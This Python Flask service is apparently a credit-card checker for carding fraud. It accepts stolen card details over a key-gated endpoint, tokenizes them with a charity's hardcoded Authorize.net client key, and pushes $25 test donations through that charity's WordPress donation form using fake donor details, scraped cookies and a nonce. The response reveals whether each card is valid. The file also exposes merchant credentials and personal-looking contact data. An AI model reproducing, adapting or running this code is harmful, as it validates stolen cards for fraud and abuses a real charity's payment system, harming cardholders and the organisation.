from flask import Flask, request, jsonify
import asyncio
import aiohttp

app = Flask(__name__)

async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")


        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://michaelsway.org',
            'Referer': 'https://michaelsway.org/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '6es9NH47',
                    'clientKey': '53SjhCyvk3huRs29J5ct3D8LE97dW4ZYGrZjh3U5jt6nW8RTdqBzwXr9hMR838j9',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': '5cf2fa5d-2414-d548-3a76-15c57296f53a',
                    'token': {
                        'cardNumber': cc,
                        'expirationDate': f'{mes}{ano[-2:]}',
                        'cardCode': cvv,
                        'zip': '10017-5571',
                    },
                },
            },
        }

        response = await session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)


        #first response (token get)
        # print(response.text)


#second response ( data get)

        cookies = {
            'charitable_session': '59264dd78be5b2fcfa1e86ce6c28d5ec||86400||82800',
            '_ga': 'GA1.2.1548066945.1743935020',
            '_gid': 'GA1.2.618708222.1743935020',
            '_gat': '1',
            '_ga_6MN2JDF2SW': 'GS1.2.1743935020.1.0.1743935020.60.0.0',
        }

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://michaelsway.org',
            'priority': 'u=1, i',
            'referer': 'https://michaelsway.org/donate/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'charitable_form_id': '67f2562759b07',
            '67f2562759b07': '',
            '_charitable_donation_nonce': 'e84032d13d',
            '_wp_http_referer': '/donate/',
            'campaign_id': '3856',
            'description': 'Donate',
            'ID': '0',
            'anet_token': 'eyJjb2RlIjoiNTBfMl8wNjAwMDUyRjk4NDY4RDA4RUQyQTJDOTdDQzVGQURBQUNGOTJDNDhCQTZCMUZFMTkzNTkxREE5MEEyOTc3RDIxMUI3NDEwMzgwOUE0RDdBOUJERDJCNUJFOEM5REM4Njk1NkQ2QjBEIiwidG9rZW4iOiI5NzQzOTM1MDU4NDQ2OTg5MTAzNjA2IiwidiI6IjEuMSJ9',
            'anet_token_description': 'COMMON.ACCEPT.INAPP.PAYMENT',
            'gateway': 'authorize_net',
            'donation_amount': '25',
            'custom_donation_amount': '25.00',
            'recurring_donation': 'once',
            'email': '2015silver@rustyload.com',
            'phone': '9072457534',
            'donation_h_select': 'in honor of',
            'honoree_name': 'yes ubs',
            'memorial_name': '',
            'i_prefer': 'Handwritten note',
            'notificants_name_and_address': '123 Dawkins Street Ext',
            'notificants_email': '',
            'first_name': 'Natalie',
            'last_name': 'funk',
            'address': '123 Park Ave Frnt 5',
            'address_2': '',
            'city': 'New York',
            'state': 'New York',
            'postcode': '10017-5571',
            'country': 'US',
            'cc_expiration[month]': mes,
            'cc_expiration[year]': ano,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        response = await session.post('https://michaelsway.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

        return await response.text()  # ✅ Fix here
    
    except Exception as e:
        print(e)
        return str(e)


@app.route("/process_card")
def process_card():
    key = request.args.get("key")  # Get 'key' parameter
    cc = request.args.get("cc")    # Get 'cc' parameter

    if key != "og":
        return jsonify({"error": "Invalid Key"}), 403

    if not cc:
        return jsonify({"error": "Missing credit card details"}), 400

    async def main():
        async with aiohttp.ClientSession() as session:  # ✅ Fix: Create a session
            return await create_payment_method(cc, session)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(main())  # ✅ Fix: Pass session

    return jsonify({"result": result})


if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
